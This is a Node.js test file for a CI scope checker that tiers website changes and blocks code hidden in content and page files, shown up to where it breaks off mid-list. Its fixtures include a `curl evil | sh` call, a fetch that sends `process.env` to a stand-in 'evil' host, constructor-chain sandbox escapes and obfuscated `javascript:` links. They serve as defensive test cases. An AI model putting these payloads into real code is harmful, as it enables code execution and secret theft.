// Tests for scripts/check-change-scope.mjs. Fake diffs only: no git repository, no network. Run with:
//   node --test scripts/check-change-scope.test.mjs   (or `npm run test:scripts`)
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { rules } from "./change-scope-rules.mjs";
import { SECRET, app1Exif, jpeg as makeJpeg, png as makePng, pngText, webp as makeWebp } from "./image-fixtures.mjs";
import {
  decide,
  evaluateChange,
  fence,
  formatReport,
  gatherChange,
  gitIn,
  main,
  parseArgs,
  parseHunkLines,
  parseRawDiff,
  safe,
} from "./check-change-scope.mjs";

// Content, routes and nav files are parsed, so a test file needs real (plain data) content unless it says otherwise.
const file = (path, status = "M", extra = {}) => ({
  path,
  status,
  added: [],
  removed: [],
  ...(rules.pagePath.test(path) || path.startsWith("public/images/") ? {} : { content: "export const x = 1;\n" }),
  ...extra,
});
const run = (files, existing = []) => evaluateChange({ files, existsAtBase: (p) => existing.includes(p) }, rules);
const kinds = (result) => result.flags.map((f) => f.kind);

const goodPage = `import type { Metadata } from "next";
import { Container } from "@/components/hl/Container";
import { PageHero } from "@/components/hl/PageHero";
import { faqHero, faqMeta } from "@/content/faq";
import { pageMetadata } from "@/lib/metadata";

export const metadata: Metadata = pageMetadata({ ...faqMeta, path: "/faq" });

export default function FaqPage() {
  return (
    <Container>
      <PageHero eyebrow={faqHero.eyebrow} title={faqHero.title} intro={faqHero.intro} />
    </Container>
  );
}
`;
const components = ["src/components/hl/Container.tsx", "src/components/hl/PageHero.tsx"];
const newPage = (content = goodPage) => file("src/app/(site)/faq/page.tsx", "A", { content });

const jpg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46, 0, 1]);
const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
const webp = Buffer.concat([Buffer.from("RIFF"), Buffer.from([1, 2, 3, 4]), Buffer.from("WEBP")]);
const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>');
const image = (path, head, size = 1000) => file(path, "A", { head, size });

// ---- tier 1 and tier 3 ----------------------------------------------------------------------------------------

test("a change to content files, images, routes and nav is tier 1", () => {
  const result = run([
    file("src/content/home.ts"),
    file("src/content/services.ts"),
    file("src/lib/routes.ts"),
    file("src/content/nav.ts"),
    image("public/images/team/photo.jpg", jpg),
  ]);
  assert.equal(result.tier, 1);
  assert.deepEqual(result.outside, []);
});

const tier3 = [
  ["worker/contact.ts", "contact form"],
  ["worker/config.ts", "contact form"],
  ["public/_headers", "security headers"],
  ["public/_redirects", "redirect"],
  ["wrangler.jsonc", "deploy"],
  ["site.config.ts", "site settings"],
  ["package.json", "package"],
  ["package-lock.json", "package"],
  [".github/workflows/ci.yml", "workflow"],
  [".claude/settings.json", "Claude"],
  ["src/components/hl/Button.tsx", "shared component"],
  ["src/content/site.ts", "wiring"],
  ["src/content/providers.ts", "wiring"],
  ["src/content/auto-reply.ts", "wiring"],
  ["src/content/deep/nested.ts", "allow-list"],
  ["src/app/layout.tsx", "allow-list"],
  ["src/app/(site)/layout.tsx", "allow-list"],
  ["src/app/(site)/about/page.tsx", "existing page"],
  ["src/lib/metadata.ts", "allow-list"],
  ["scripts/preview.mjs", "allow-list"],
  ["docs/STATUS.md", "allow-list"],
  ["public/brand/logo.svg", "allow-list"],
  ["README.md", "allow-list"],
];
for (const [path, hint] of tier3) {
  test(`${path} is tier 3`, () => {
    const result = run([file("src/content/home.ts"), file(path)]);
    assert.equal(result.tier, 3);
    assert.deepEqual(result.outside.map((o) => o.path), [path]);
    assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
  });
}

test("an empty change is tier 1", () => {
  assert.equal(run([]).tier, 1);
});

// ---- new pages ------------------------------------------------------------------------------------------------

test("a new page built from existing components is tier 1", () => {
  const result = run([newPage(), file("src/content/faq.ts", "A"), file("src/lib/routes.ts", "M", { added: ['export const indexableRoutes = ["/", "/faq"];'] })], components);
  assert.equal(result.tier, 1);
  assert.deepEqual(kinds(result), []);
});

test("a new page missing from routes.ts is flagged (it would miss the sitemap and the a11y scan)", () => {
  const result = run([newPage(), file("src/content/faq.ts", "A")], components);
  assert.equal(result.tier, 1);
  assert.deepEqual(kinds(result), ["new-page-not-in-routes"]);
});

const badPages = [
  ["imports a component that does not exist at the base", goodPage.replace("hl/Container", "hl/Nope"), "Nope"],
  ["uses a relative import", goodPage + 'import { x } from "./helper";\n', "./helper"],
  ["imports another lib file", goodPage + 'import { x } from "@/lib/placeholders";\n', "@/lib/placeholders"],
  ["imports the wiring module site.ts", goodPage + 'import { siteConfig } from "@/content/site";\n', "@/content/site"],
  ["imports a package", goodPage + 'import leftPad from "left-pad";\n', "left-pad"],
  ["has a bare side-effect import", goodPage + 'import "./evil.css";\n', "./evil.css"],
  ["is a client component", '"use client";\n' + goodPage, "use client"],
  ["uses dangerouslySetInnerHTML", goodPage.replace("<Container>", "<div dangerouslySetInnerHTML={{ __html: x }} /><Container>"), "dangerouslySetInnerHTML"],
  ["adds a script tag", goodPage.replace("<Container>", "<script src=\"x\" /><Container>"), "<script"],
  ["adds an iframe", goodPage.replace("<Container>", "<iframe src=\"x\" /><Container>"), "<iframe"],
  ["calls fetch", goodPage + 'const r = fetch("/api");\n', "fetch("],
  ["reads process.env", goodPage + "const k = process.env.KEY;\n", "process.env"],
  ["uses eval", goodPage + 'eval("1");\n', "eval("],
  ["uses a dynamic import", goodPage + 'const m = import("x");\n', "import("],
  ["does not call pageMetadata", goodPage.replace("pageMetadata(", "somethingElse("), "pageMetadata"],
];
for (const [name, content, hint] of badPages) {
  test(`a new page that ${name} is tier 3`, () => {
    const result = run([newPage(content)], components);
    assert.equal(result.tier, 3);
    assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
  });
}

test("page files that are not exactly src/app/(site)/<name>/page.tsx stay tier 3", () => {
  for (const path of [
    "src/app/(site)/a/b/page.tsx",
    "src/app/(site)/Faq/page.tsx",
    "src/app/(site)/faq/layout.tsx",
    "src/app/(site)/faq/opengraph-image.tsx",
    "src/app/faq/page.tsx",
    "src/app/(site)/faq/route.ts",
  ]) {
    assert.equal(run([file(path, "A", { content: goodPage })], components).tier, 3, path);
  }
});

test("editing an existing page is tier 3, and an unreadable new page is tier 3", () => {
  assert.equal(run([file("src/app/(site)/faq/page.tsx", "M", { content: goodPage })], components).tier, 3);
  assert.equal(run([file("src/app/(site)/faq/page.tsx", "A")], components).tier, 3);
});

// ---- removed pages and routes ---------------------------------------------------------------------------------

test("deleting a page is tier 1 but flagged", () => {
  const result = run([file("src/app/(site)/faq/page.tsx", "D")]);
  assert.equal(result.tier, 1);
  assert.deepEqual(kinds(result), ["removed-page"]);
});

test("removing a route from routes.ts is flagged; moving it is not", () => {
  const removed = run([file("src/lib/routes.ts", "M", { removed: ['export const indexableRoutes = ["/", "/faq"];'], added: ['export const indexableRoutes = ["/"];'] })]);
  assert.deepEqual(kinds(removed), ["removed-page"]);
  const moved = run([file("src/lib/routes.ts", "M", { removed: ['export const indexableRoutes = ["/", "/faq"];'], added: ['export const indexableRoutes = ["/",', '  "/faq"];'] })]);
  assert.deepEqual(kinds(moved), []);
});

// ---- flags ----------------------------------------------------------------------------------------------------

const flagged = (line, side = "added") => run([file("src/content/home.ts", "M", { [side]: [line] })]);

test("dollar amounts are flagged, in added and in removed lines", () => {
  for (const line of ['title: "From $900"', "price: '[[$750]]'", 'note: "about 500 USD"', 'note: "12 dollars a month"', 'note: "$1,200.50"']) {
    assert.deepEqual(kinds(flagged(line)), ["dollar"], line);
    assert.deepEqual(kinds(flagged(line, "removed")), ["dollar"], line);
  }
});

test("lines without a dollar amount are not flagged", () => {
  for (const line of ["const a = `${name} says hi`;", 'title: "Our dollar store"', 'cost: "$"', 'year: "2026"', 'title: "Opening hours"']) {
    assert.deepEqual(kinds(flagged(line)), [], line);
  }
});

test("contact details and booking links are flagged", () => {
  for (const line of [
    'email: "owner@example.com"',
    'href: "mailto:hello@example.org"',
    'href: "tel:+15551234567"',
    'phone: "(555) 123-4567"',
    'phone: "555-123-4567"',
    'phone: "555.123.4567"',
    'href: "https://calendly.com/someone/30min"',
    'href: "https://cal.com/someone"',
    'href: "https://calendar.app.google/abc"',
  ]) {
    assert.deepEqual(kinds(flagged(line)), ["contact"], line);
  }
});

test("import specifiers and dates are not mistaken for contact details", () => {
  for (const line of ['import { x } from "@/content/home";', 'updated: "2026-11-22"', 'a: "version 1.2.3"', 'b: "@lhci/cli@0.16.1"']) {
    assert.deepEqual(kinds(flagged(line)), [], line);
  }
});

test("changes to the privacy text and the form fields are flagged", () => {
  assert.deepEqual(kinds(run([file("src/content/privacy.ts")])), ["sensitive-file"]);
  assert.deepEqual(kinds(run([file("src/content/contact-fields.ts")])), ["sensitive-file"]);
});

test("a change is flagged only when it is over the size limits", () => {
  const lines = (n) => Array.from({ length: n }, (_, i) => `line ${i}`);
  assert.deepEqual(kinds(run([file("src/content/home.ts", "M", { added: lines(150), removed: lines(150) })])), []);
  assert.deepEqual(kinds(run([file("src/content/home.ts", "M", { added: lines(150), removed: lines(151) })])), ["size"]);
  const tenFiles = Array.from({ length: 10 }, (_, i) => file(`src/content/c${i}.ts`));
  assert.deepEqual(kinds(run(tenFiles)), []);
  assert.deepEqual(kinds(run([...tenFiles, file("src/content/c10.ts")])), ["size"]);
});

test("flags never change the tier", () => {
  const result = run([file("src/content/home.ts", "M", { added: ['title: "$900"'] }), file("src/content/privacy.ts")]);
  assert.equal(result.tier, 1);
  assert.equal(result.flags.length, 2);
});

// ---- images ---------------------------------------------------------------------------------------------------

test("jpg, png and webp images with matching bytes under 500 KB pass", () => {
  const result = run([image("public/images/a.jpg", jpg), image("public/images/b.JPEG", jpg), image("public/images/c.png", png), image("public/images/d/e.webp", webp)]);
  assert.deepEqual(result.imageProblems, []);
});

test("other formats fail, SVG included", () => {
  for (const path of ["public/images/a.svg", "public/images/a.gif", "public/images/a.avif", "public/images/a"]) {
    const result = run([image(path, svg)]);
    assert.equal(result.imageProblems.length, 1, path);
    assert.equal(result.imageProblems[0].path, path);
  }
  assert.match(run([image("public/images/a.svg", svg)]).imageProblems[0].reason, /SVG/);
});

test("a file whose bytes do not match its extension fails (an SVG renamed to .png)", () => {
  assert.equal(run([image("public/images/a.png", svg)]).imageProblems.length, 1);
  assert.equal(run([image("public/images/a.jpg", png)]).imageProblems.length, 1);
  assert.equal(run([image("public/images/a.webp", jpg)]).imageProblems.length, 1);
});

test("the size limit is 500 KB (512,000 bytes)", () => {
  assert.equal(run([image("public/images/a.jpg", jpg, 512000)]).imageProblems.length, 0);
  assert.equal(run([image("public/images/a.jpg", jpg, 512001)]).imageProblems.length, 1);
});

test("deleted images and files outside public/images are not checked by the image rules", () => {
  assert.deepEqual(run([file("public/images/a.svg", "D")]).imageProblems, []);
  assert.deepEqual(run([image("public/brand/logo.svg", svg)]).imageProblems, []);
});

// ---- placeholders ---------------------------------------------------------------------------------------------

test("a new [[placeholder]] in content or app files is reported", () => {
  const result = run([
    file("src/content/home.ts", "M", { added: ['phone: "[[Phone number]]"'] }),
    file("src/app/(site)/faq/page.tsx", "M", { added: ["<p>[[TBD]]</p>"] }),
  ]);
  assert.deepEqual(result.placeholders.map((p) => p.text), ["[[Phone number]]", "[[TBD]]"]);
});

test("removed placeholder lines and other folders are not reported", () => {
  const result = run([
    file("src/content/home.ts", "M", { removed: ['phone: "[[Phone number]]"'] }),
    file("worker/contact.ts", "M", { added: ["// [[note]]"] }),
    file("docs/STATUS.md", "M", { added: ["[[x]]"] }),
    file("src/app/hl.css", "M", { added: ["/* [[x]] */"] }),
  ]);
  assert.deepEqual(result.placeholders, []);
});

// ---- the decision ---------------------------------------------------------------------------------------------

test("strict mode fails on tier 3, bad images and new placeholders, and passes on a flagged tier 1 change", () => {
  assert.equal(decide(run([file("worker/contact.ts")]), "strict").ok, false);
  assert.equal(decide(run([image("public/images/a.svg", svg)]), "strict").ok, false);
  assert.equal(decide(run([file("src/content/home.ts", "M", { added: ["[[x]]"] })]), "strict").ok, false);
  assert.equal(decide(run([file("src/content/home.ts", "M", { added: ['"$9"'] })]), "strict").ok, true);
  assert.equal(decide(run([file("src/content/home.ts")]), "strict").ok, true);
});

test("report-only mode never fails", () => {
  assert.equal(decide(run([file("worker/contact.ts"), image("public/images/a.svg", svg)]), "report-only").ok, true);
});

// ---- plain-English output -------------------------------------------------------------------------------------

test("the report says in plain English what happened", () => {
  const ok = formatReport(run([file("src/content/home.ts", "M", { added: ['"$900"'] })]), { mode: "strict" });
  assert.match(ok, /Tier 1/);
  assert.match(ok, /Flagged for Grant/);
  assert.match(ok, /dollar/i);
  assert.match(ok, /PASS/);
  const bad = formatReport(run([file("worker/contact.ts"), image("public/images/a.svg", svg), file("src/content/home.ts", "M", { added: ["[[x]]"] })]), { mode: "strict" });
  assert.match(bad, /Tier 3/);
  assert.match(bad, /worker\/contact\.ts/);
  assert.match(bad, /public\/images\/a\.svg/);
  assert.match(bad, /\[\[x\]\]/);
  assert.match(bad, /FAIL/);
  assert.match(formatReport(run([file("worker/contact.ts")]), { mode: "report-only" }), /report only/i);
});

// ---- parsing git output ---------------------------------------------------------------------------------------

const rawEntry = (status, path, oldMode = "100644", newMode = "100644") => `:${oldMode} ${newMode} 1111111 2222222 ${status}\0${path}\0`;

test("parseRawDiff reads git's NUL-separated raw output, keeping odd paths and the modes intact", () => {
  const raw = rawEntry("M", "src/content/home.ts") + rawEntry("A", "src/app/(site)/faq/page.tsx", "000000") + rawEntry("D", "old file.txt", "100644", "000000") + rawEntry("T", "src/content/link.ts", "100644", "120000");
  assert.deepEqual(parseRawDiff(raw), [
    { status: "M", path: "src/content/home.ts", oldMode: "100644", newMode: "100644" },
    { status: "A", path: "src/app/(site)/faq/page.tsx", oldMode: "000000", newMode: "100644" },
    { status: "D", path: "old file.txt", oldMode: "100644", newMode: "000000" },
    { status: "T", path: "src/content/link.ts", oldMode: "100644", newMode: "120000" },
  ]);
  assert.deepEqual(parseRawDiff(""), []);
});

test("parseHunkLines ignores diff headers, even when a changed line starts with +++ or ---", () => {
  const patch = [
    "diff --git a/x.ts b/x.ts",
    "index 111..222 100644",
    "--- a/x.ts",
    "+++ b/x.ts",
    "@@ -1,2 +1,2 @@",
    "-old line",
    "+++ new line that starts with plus signs",
    "--- dashes inside the hunk",
    "+new line",
    "\\ No newline at end of file",
    "@@ -9 +9 @@",
    "+later",
  ].join("\n");
  assert.deepEqual(parseHunkLines(patch), {
    added: ["++ new line that starts with plus signs", "new line", "later"],
    removed: ["old line", "-- dashes inside the hunk"],
  });
});

// ---- command line ---------------------------------------------------------------------------------------------

test("parseArgs: defaults, explicit refs and modes", () => {
  assert.deepEqual(parseArgs([], {}), { base: "origin/main", head: "HEAD", mode: "strict" });
  assert.deepEqual(parseArgs(["--base", "main", "--head", "feature", "--report-only"], {}), { base: "main", head: "feature", mode: "report-only" });
  assert.equal(parseArgs(["--strict"], {}).mode, "strict");
});

test("parseArgs --ci reads GitHub's own variables: strict only on change/ branches", () => {
  assert.deepEqual(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "change/opening-hours" }), { base: "origin/main", head: "HEAD", mode: "strict" });
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "feat/x" }).mode, "report-only");
  assert.match(parseArgs(["--ci"], {}).skip, /not a pull request/i);
});

test("parseArgs --ci treats change/ in any capitalisation as a change branch", () => {
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "Change/Opening-Hours" }).mode, "strict");
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "exchange/x" }).mode, "report-only");
});

test("parseArgs rejects unknown flags, missing values and refs that look like options", () => {
  assert.match(parseArgs(["--nope"], {}).error, /--nope/);
  assert.match(parseArgs(["--base"], {}).error, /--base/);
  assert.match(parseArgs(["--base", "--head"], {}).error, /--base/);
  assert.match(parseArgs(["--head", "-Ofoo"], {}).error, /--head/);
});

// ---- the git layer, with a fake git ---------------------------------------------------------------------------

/** A table of git calls and their output. A value of null means "git exited with status 1" (what `git grep` does for no match). */
function fakeGit(table) {
  return (args) => {
    const key = args.join(" ");
    if (!(key in table)) throw new Error(`unexpected git call: ${key}`);
    if (table[key] === null) throw Object.assign(new Error("git exited with status 1"), { status: 1 });
    return Buffer.from(table[key]);
  };
}

const RANGE = "origin/main...HEAD";
const cleanJpeg = makeJpeg();
const HOME_WITH_IMAGE = 'export const title = "From $900";\nexport const hero = { src: "/images/new.jpg", alt: "The front desk at opening time" };\n';
const grepKey = (url) => `grep -l -I -F -z -e ${url} HEAD -- src`;
const scenario = () => ({
  "merge-base origin/main HEAD": "abc123\n",
  [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "src/content/home.ts") + rawEntry("A", "public/images/new.jpg", "000000") + rawEntry("A", "src/app/(site)/faq/page.tsx", "000000"),
  [`diff -U0 --no-renames --text ${RANGE} -- src/content/home.ts`]: '@@ -1 +1 @@\n-title: "Old"\n+title: "From $900"\n',
  "show HEAD:src/content/home.ts": HOME_WITH_IMAGE,
  "show HEAD:public/images/new.jpg": cleanJpeg,
  [grepKey("/images/new.jpg")]: "HEAD:src/content/home.ts\0",
  "show HEAD:src/app/(site)/faq/page.tsx": goodPage,
  [`diff -U0 --no-renames --text ${RANGE} -- src/app/(site)/faq/page.tsx`]: goodPage.split("\n").map((l) => `+${l}`).join("\n").replace(/^/, "@@ -0,0 +1 @@\n"),
  "cat-file -e abc123:src/components/hl/Container.tsx": "",
  "cat-file -e abc123:src/components/hl/PageHero.tsx": "",
});

test("gatherChange builds the change from git output and evaluateChange sorts it", () => {
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(scenario()) });
  assert.deepEqual(change.files.map((f) => [f.status, f.path]), [
    ["M", "src/content/home.ts"],
    ["A", "public/images/new.jpg"],
    ["A", "src/app/(site)/faq/page.tsx"],
  ]);
  assert.deepEqual(change.files[0].added, ['title: "From $900"']);
  assert.equal(change.files[1].size, cleanJpeg.length);
  const result = evaluateChange(change, rules);
  assert.equal(result.tier, 1);
  assert.deepEqual(kinds(result).sort(), ["dollar", "new-page-not-in-routes"]);
});

test("main prints the report and sets the exit code for the mode", () => {
  const out = [];
  const env = {};
  assert.equal(main({ argv: [], env, git: fakeGit(scenario()), out: (t) => out.push(t) }), 0);
  assert.match(out.join("\n"), /Tier 1/);

  const bad = { ...scenario(), [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "worker/contact.ts"), [`diff -U0 --no-renames --text ${RANGE} -- worker/contact.ts`]: "" };
  assert.equal(main({ argv: [], env, git: fakeGit(bad), out: () => {} }), 1);
  assert.equal(main({ argv: ["--report-only"], env, git: fakeGit(bad), out: () => {} }), 0);
});

test("main exits 2 on bad flags, 0 with a note outside a pull request, and 2 if git fails", () => {
  const out = [];
  assert.equal(main({ argv: ["--nope"], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 2);
  assert.equal(main({ argv: ["--ci"], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 0);
  assert.match(out.join("\n"), /not a pull request/i);
  assert.equal(main({ argv: [], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 2);
});

test("main appends the report to the GitHub job summary when one is set", () => {
  const dir = mkdtempSync(join(tmpdir(), "scope-"));
  try {
    const summary = join(dir, "summary.md");
    main({ argv: [], env: { GITHUB_STEP_SUMMARY: summary }, git: fakeGit(scenario()), out: () => {} });
    assert.match(readFileSync(summary, "utf8"), /Tier 1/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("repeated flags in one file are shown once with a count", () => {
  const report = formatReport(run([file("src/content/home.ts", "M", { added: ['a: "$1"', 'b: "$2"', 'c: "$3"'] })]), { mode: "strict" });
  assert.match(report, /Flagged for Grant \(1 flag;/);
  assert.match(report, /\(and 2 more like it\)/);
});

// ---- review findings: tier 1 .ts files are code (C1) ----------------------------------------------------------

const codeInContent = [
  ["a call at the top level", 'import { execSync } from "node:child_process";\nexecSync("curl evil | sh");\n', "node:child_process"],
  ["a fetch call", 'fetch("https://evil/" + JSON.stringify(process.env));\n', "ExpressionStatement"],
  ["require", 'export const a = require("child_process");\n', "CallExpression"],
  ["process.env", "export const a = process.env.KEY;\n", "process"],
  ["a function value", "export const a = () => 1;\n", "ArrowFunction"],
  ["a template with a substitution", "export const a = `${x}`;\n", "TemplateExpression"],
  ["a function declaration", "export function f() {}\n", "FunctionDeclaration"],
  ["a default export", "export default { a: 1 };\n", "ExportAssignment"],
  ["a let variable", "let a = 1;\n", "const"],
  ["a method call", "export const a = [1].map((x) => x);\n", "CallExpression"],
  ["an import from a package", 'import evil from "evil";\nexport const a = 1;\n', "evil"],
  ["an import from the worker", 'import { x } from "../../worker/contact";\nexport const a = 1;\n', "worker/contact"],
  ["an import of a wiring module", 'import { providers } from "./providers";\nexport const a = 1;\n', "./providers"],
  ["a re-export", 'export * from "../../worker/contact";\n', "re-exports"],
  ["globalThis", "export const a = globalThis;\n", "globalThis"],
  ["destructuring", "export const { a } = obj;\n", "destructuring"],
  ["constructor access", "export const a = x.constructor;\n", "constructor"],
  ["an operator other than +", "export const a = 1 * 2;\n", "operator"],
  ["a class", "class A {}\n", "ClassDeclaration"],
  ["a NUL byte", 'export const a = "x";\0\n', "NUL"],
  ["a getter", "export const a = { get x() { return 1; } };\n", "method or accessor"],
];
for (const path of ["src/content/home.ts", "src/content/contact-fields.ts", "src/content/nav.ts", "src/lib/routes.ts"]) {
  for (const [name, content, hint] of codeInContent) {
    test(`${path} with ${name} is tier 3`, () => {
      const result = run([file(path, "M", { content })]);
      assert.equal(result.tier, 3);
      assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
    });
  }
}

test("plain data in a content file is tier 1", () => {
  const data = `// Comments are fine.
import type { Need } from "anything";
import { type Other } from "anything";
import { needOptions } from "./contact-fields";
import { more } from "@/content/home";

export type Item = { label: string; href: string };
export interface Shape { a: number }
export const hero = { eyebrow: "Hi", n: -1, list: [1, "two", true, null], nested: { a: [{ b: "c" }] } } as const;
export const typed: readonly Item[] = [{ label: "A", href: "/a" }] satisfies readonly Item[];
export const joined = "a" + "b";
export const copy = { ...hero, extra: needOptions };
export const ref = hero.eyebrow;
export const tpl = \`plain text\`;
export { hero as alias };
`;
  assert.equal(run([file("src/content/home.ts", "M", { content: data })]).tier, 1);
});

test("a file that could not be read is tier 3, and deleting routes.ts or nav.ts is tier 3", () => {
  assert.equal(run([file("src/content/home.ts", "M", { content: undefined })]).tier, 3);
  assert.equal(run([file("src/lib/routes.ts", "D")]).tier, 3);
  assert.equal(run([file("src/content/nav.ts", "D")]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "D")]).tier, 1);
});

// ---- review findings: the new-page checks cannot be bypassed with spacing tricks (C2) -------------------------

const pageBypasses = [
  ["a same-line import after a statement", 'export const a=1; import {execSync} from "node:child_process";\n', "node:child_process"],
  ["a leading semicolon import", ';import "node:child_process";\n', "node:child_process"],
  ["an import without spaces", 'import{execSync}from"node:child_process";\n', "node:child_process"],
  ["a re-export without spaces", 'export*from"../../../../worker/contact";\n', "ExportDeclaration"],
  ["import = require", 'import x = require("child_process");\n', "ImportEqualsDeclaration"],
  ["require", 'const r = require("child_process");\n', "require"],
  ["a spaced dynamic import", 'const m = import ("node:child_process");\n', "dynamic import"],
  ["a spaced fetch", 'const f = fetch ("https://evil");\n', "fetch"],
  ["globalThis with a built key", 'const g = globalThis["fe"+"tch"];\n', "property name"],
  ["process with a string key", 'const p = process["env"];\n', "process"],
  ["the Function constructor", 'const F = (() => 1).constructor("return 1");\n', ".constructor"],
  ["the Function constructor by string key", 'const F = (() => 1)["constructor"]("x");\n', "constructor"],
  ["a property name built at run time", 'const k = "a"; const v = obj[k + "b"];\n', "property name"],
  ["setTimeout with a string", 'const t = setTimeout("code", 1);\n', "setTimeout"],
  ["a top-level call", 'console.log("x");\n', "ExpressionStatement"],
  ["a class", "class A {}\n", "ClassDeclaration"],
  ["a spaced script tag", goodPage.replace("<Container>", '<Container>< script src="x" />'), "<script>"],
  ["a capitalised Script tag", goodPage.replace("<Container>", '<Container><Script src="x" />'), "<Script>"],
  ["a form", goodPage.replace("<Container>", '<Container><form action="/x"></form>'), "<form>"],
  ["a javascript: link", goodPage.replace("<Container>", '<Container><a href="javascript:alert(1)">x</a>'), "javascript:"],
  ["a data: link", goodPage.replace("<Container>", '<Container><a href="data:text/html;base64,AAAA">x</a>'), "data:"],
];
for (const [name, extra, hint] of pageBypasses) {
  test(`a new page with ${name} is tier 3`, () => {
    const content = extra.includes("export default function") ? extra : goodPage + extra;
    const result = run([newPage(content)], components);
    assert.equal(result.tier, 3, content);
    assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
  });
}

// The page check is an allowlist grammar, so a danger nobody listed is still rejected (re-review of C2).
const pageWith = (body) => `import { pageMetadata } from "@/lib/metadata";
import { Container } from "@/components/hl/Container";
export const metadata = pageMetadata({ title: "x", path: "/faq" });
${body}
`;
const grammarBypasses = [
  ["a constructor chain through a variable key", 'const k = "con"+"structor";\nexport default function P() { const v = [][k][k]("return process")(); return <Container>{v}</Container>; }'],
  ["a computed key spread into JSX", 'export default function P() { const o = {["dangerously"+"SetInnerHTML"]: {__html: "<script>alert(1)</script>"}}; return <div {...o} />; }'],
  ["a JSX spread of plain props", "export default function P(props) { return <div {...props} />; }"],
  ["a built javascript: URL", 'export default function P() { return <a href={"java"+"script:alert(1)"}>x</a>; }'],
  ["getPrototypeOf on an async function", 'const k = "con"+"structor";\nexport default function P() { const F = Object.getPrototypeOf(async function () {})[k]; return <Container>{F}</Container>; }'],
  ["an arrow function outside a callback", "const f = () => 1;\nexport default function P() { return <Container />; }"],
  ["an async default function", "export default async function P() { return <Container />; }"],
  ["a template with a substitution", "const t = `a${b}`;\nexport default function P() { return <Container />; }"],
  ["new", "const d = new Date();\nexport default function P() { return <Container />; }"],
  ["an if statement", "export default function P() { if (x) { return null; } return <Container />; }"],
  ["an unknown lowercase tag", "export default function P() { return <Container><marquee>x</marquee></Container>; }"],
  ["a component that is not imported", "export default function P() { return <Evil />; }"],
  ["assignment", "export default function P() { let a = 1; a = 2; return <Container />; }"],
  ["a computed key in an object", 'const o = { ["a" + "b"]: 1 };\nexport default function P() { return <Container />; }'],
  ["a spread child", "export default function P() { return <Container>{...x}</Container>; }"],
  ["a syntax error", "export default function P() { return <Container>; }"],
  ["a number index on a string-keyed lookup", 'export default function P() { return <Container>{obj["a" + "b"]}</Container>; }'],
];
for (const [name, body] of grammarBypasses) {
  test(`a new page with ${name} is tier 3`, () => {
    const result = run([newPage(pageWith(body))], components);
    assert.equal(result.tier, 3, body);
  });
}

// Re-review round 3 (C3): the grammar also bans ambient globals, object receivers and function-valued arguments.
const c3Bypasses = [
  [
    "the reviewer's exact build-time code execution page",
    `const fp = [parseInt].map(Object.getPrototypeOf);
const d = fp.map(Object.getOwnPropertyDescriptors);
const vals = d.map(Object.values);
const F = vals[0][4].value;
const G = { slice: F }.slice("return process.version");
const out = { slice: G }.slice(0);
export default function P() { return <Container>{out}</Container>; }`,
  ],
  ["an ambient global (Object)", "const x = Object;\nexport default function P() { return <Container />; }"],
  ["an ambient global (JSON)", "const x = JSON;\nexport default function P() { return <Container />; }"],
  ["an object literal as the receiver", "const x = { slice: Container }.slice(0);\nexport default function P() { return <Container />; }"],
  ["a function value passed to .map", "const x = [1].map(Container);\nexport default function P() { return <Container />; }"],
  ["a second argument to .map", "const x = [1].map((a) => a, Container);\nexport default function P() { return <Container />; }"],
  ["a name passed to .slice", "const x = [1].slice(Container);\nexport default function P() { return <Container />; }"],
  ["constructor taken out by destructuring", "const { constructor: C } = [].map;\nexport default function P() { return <Container />; }"],
  ["constructor taken out by shorthand destructuring", "const { constructor } = [].map;\nexport default function P() { return <Container />; }"],
  ["prototype taken out by destructuring", "const { prototype: C } = [].map;\nexport default function P() { return <Container />; }"],
  ["a shorthand property naming a global", "const o = { process };\nexport default function P() { return <Container />; }"],
  ["a value import of next", 'import next from "next";\nexport default function P() { return <Container />; }'],
  ["an HTML character reference in an href", 'export default function P() { return <Container><a href="&#106;avascript:alert(1)">x</a></Container>; }'],
  ["a named character reference in an href", 'export default function P() { return <Container><a href="java&Tab;script:alert(1)">x</a></Container>; }'],
];
for (const [name, body] of c3Bypasses) {
  test(`a new page with ${name} is tier 3`, () => {
    assert.equal(run([newPage(pageWith(body))], components).tier, 3, body);
  });
}

const callPrimitives = [
  ["a const object holding a function under an array method name", "const o = { concat: Container };\nconst r = o.concat(1, 2);\nexport default function P() { return <Container />; }"],
  ["a shorthand key named like an array method", "const slice = Container;\nconst o = { slice };\nexport default function P() { return <Container />; }"],
  ["a quoted key named like an array method", 'const o = { "join": Container };\nexport default function P() { return <Container />; }'],
  ["a destructured array method name", "const { concat } = Container;\nexport default function P() { return <Container />; }"],
  ["reading .call", "const c = Container.call;\nexport default function P() { return <Container />; }"],
  ["reading .bind", "const c = Container.bind;\nexport default function P() { return <Container />; }"],
  ["reading .apply", "const c = Container.apply;\nexport default function P() { return <Container />; }"],
  ["reading __lookupGetter__", "const c = Container.__lookupGetter__;\nexport default function P() { return <Container />; }"],
